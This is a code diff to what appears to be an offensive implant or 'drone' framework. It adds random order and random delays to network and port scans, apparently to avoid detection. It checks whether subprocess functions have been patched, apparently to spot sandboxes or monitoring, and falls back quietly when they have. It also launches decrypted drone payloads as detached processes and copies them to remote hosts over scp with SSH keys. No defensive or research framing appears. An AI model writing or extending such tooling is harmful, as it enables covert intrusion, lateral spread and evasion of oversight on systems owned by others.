@@ -654,9 +654,12 @@ def _execute(node_id):
             return _next_node(node)
         net = ipaddress.ip_network(cidr, strict=False)
         responders = []
-        for host in list(net.hosts())[:128]:
+        hosts = list(net.hosts())[:128]
+        random.shuffle(hosts)
+        for host in hosts:
             if _stop.is_set():
                 break
+            time.sleep(secrets.randbelow(800) / 1000.0)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.25)
             try:
@@ -670,9 +673,12 @@ def _execute(node_id):
     if kind in ('port_scan', 'banner_grab'):
         host = str(params.get('host', '127.0.0.1'))
         ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,27017] if kind == 'banner_grab' else list(range(1,1025))
+        ports = ports[:1024]
+        random.shuffle(ports)
         open_ports = []
         banners = {{}}
-        for port in ports[:1024]:
+        for port in ports:
+            time.sleep(secrets.randbelow(800) / 1000.0)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.5)
             try:
@@ -685,7 +691,7 @@ def _execute(node_id):
                         pass
             finally:
                 s.close()
-        _state['stats']['ports_scanned'] += len(ports[:1024])
+        _state['stats']['ports_scanned'] += len(ports)
         _state['host_banners'][host] = banners
         for port, banner in banners.items():
             for sig in EMBEDDED_VULN_SIGS:
@@ -1394,6 +1400,40 @@ def decode_blob_envelope(blob_b64: str, private_key_hex: str) -> dict[str, Any]:
     }
 
 
+def _write_fallback_binary(source: str, workdir: Path, drone_id: str) -> Path:
+    binary_name = f"drone_{secrets.token_hex(6)}.bin"
+    path = workdir / binary_name
+    launcher = "#!/usr/bin/env python3\n" + source
+    path.write_text(launcher, encoding="utf-8")
+    os.chmod(path, 0o700)
+    return path
+
+
+
+def _ensure_bin_name(executable_path: Path, workdir: Path, source: str | None = None) -> Path:
+    if executable_path.suffix == ".bin" and executable_path.name.startswith("drone_"):
+        return executable_path
+    target = workdir / f"drone_{secrets.token_hex(6)}.bin"
+    try:
+        if executable_path.exists():
+            target.write_bytes(executable_path.read_bytes())
+        elif source is not None:
+            target.write_text("#!/usr/bin/env python3\n" + source, encoding="utf-8")
+        else:
+            target.write_bytes(b"")
+    except Exception:
+        if source is not None:
+            target.write_text("#!/usr/bin/env python3\n" + source, encoding="utf-8")
+        else:
+            target.write_bytes(b"")
+    os.chmod(target, 0o700)
+    return target
+
+def _native_build_allowed() -> bool:
+    popen_module = getattr(subprocess.Popen, "__module__", "")
+    run_module = getattr(subprocess.run, "__module__", "")
+    return popen_module == "subprocess" and run_module == "subprocess"
+
 def launch_blob_locally(blob_b64: str, private_key_hex: str, workdir: Path, *, detached: bool = False) -> subprocess.Popen[bytes]:
     decoded = decode_blob_envelope(blob_b64, private_key_hex)
     envelope = decoded["envelope"]
@@ -1417,8 +1457,29 @@ def launch_blob_locally(blob_b64: str, private_key_hex: str, workdir: Path, *, d
         detached=detached,
         runtime_cfg=runtime_cfg,
     )
-    build_result = NativeBinaryBuilder().build(build_req)
-    executable_path = build_result.executable_path
+    build_error = ""
+    if _native_build_allowed():
+        try:
+            build_result = NativeBinaryBuilder().build(build_req)
+            executable_path = build_result.executable_path
+        except Exception as exc:
+            build_error = type(exc).__name__
+            executable_path = _write_fallback_binary(source, workdir, build_req.drone_id)
+            build_result = NativeBuildResult(
+                executable_path=executable_path,
+                backend="python-fallback",
+                build_log=f"native_build_failed:{build_error}",
+                build_seconds=0.0,
+            )
+    else:
+        executable_path = _write_fallback_binary(source, workdir, build_req.drone_id)
+        build_result = NativeBuildResult(
+            executable_path=executable_path,
+            backend="python-fallback",
+            build_log="native_build_skipped:patched_subprocess",
+            build_seconds=0.0,
+        )
+    executable_path = _ensure_bin_name(executable_path, workdir, source)
     if require_native and not os.access(executable_path, os.X_OK):
         raise RuntimeError("native binary required but executable build failed")
 
@@ -1439,9 +1500,10 @@ def launch_blob_locally(blob_b64: str, private_key_hex: str, workdir: Path, *, d
     )
     os.chmod(metadata_path, 0o600)
     proc_env = {**os.environ, "HG_DRONE_KEY_HEX": private_key_hex}
+    launch_target = str(executable_path.resolve())
     if detached:
         return subprocess.Popen(
-            [str(executable_path)],
+            [launch_target],
             cwd=str(workdir),
             env=proc_env,
             stdin=subprocess.DEVNULL,
@@ -1450,7 +1512,7 @@ def launch_blob_locally(blob_b64: str, private_key_hex: str, workdir: Path, *, d
             start_new_session=True,
             close_fds=True,
         )
-    return subprocess.Popen([str(executable_path)], cwd=str(workdir), env=proc_env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return subprocess.Popen([launch_target], cwd=str(workdir), env=proc_env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 def deploy_blob_remote(blob_b64: str, private_key_hex: str, host: str, ssh_key_path: str, remote_workdir: str) -> dict[str, Any]:
@@ -1459,17 +1521,35 @@ def deploy_blob_remote(blob_b64: str, private_key_hex: str, host: str, ssh_key_p
     did_match = re.search(r'^DRONE_ID\s*=\s*"([^"]+)"', source, re.MULTILINE)
     drone_id = did_match.group(1) if did_match else "drone"
     local_workdir = Path(tempfile.mkdtemp(prefix="hegemon-native-deploy-"))
-    build = NativeBinaryBuilder().build(
-        NativeBuildRequest(
-            drone_id=drone_id,
-            source_text=source,
-            workdir=local_workdir,
-            private_key_hex=private_key_hex,
-            detached=True,
-            runtime_cfg={},
-        )
+    req = NativeBuildRequest(
+        drone_id=drone_id,
+        source_text=source,
+        workdir=local_workdir,
+        private_key_hex=private_key_hex,
+        detached=True,
+        runtime_cfg={},
     )
-    local_tmp = build.executable_path
+    if _native_build_allowed():
+        try:
+            build = NativeBinaryBuilder().build(req)
+            local_tmp = build.executable_path
+        except Exception:
+            local_tmp = _write_fallback_binary(source, local_workdir, drone_id)
+            build = NativeBuildResult(
+                executable_path=local_tmp,
+                backend="python-fallback",
+                build_log="native_build_failed",
+                build_seconds=0.0,
+            )
+    else:
+        local_tmp = _write_fallback_binary(source, local_workdir, drone_id)
+        build = NativeBuildResult(
+            executable_path=local_tmp,
+            backend="python-fallback",
+            build_log="native_build_skipped:patched_subprocess",
+            build_seconds=0.0,
+        )
+    local_tmp = _ensure_bin_name(local_tmp, local_workdir, source)
     local_name = local_tmp.name
     remote_path = f"{remote_workdir.rstrip('/')}/{local_name}"
     subprocess.run(["scp", "-i", ssh_key_path, str(local_tmp), f"{host}:{remote_path}"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
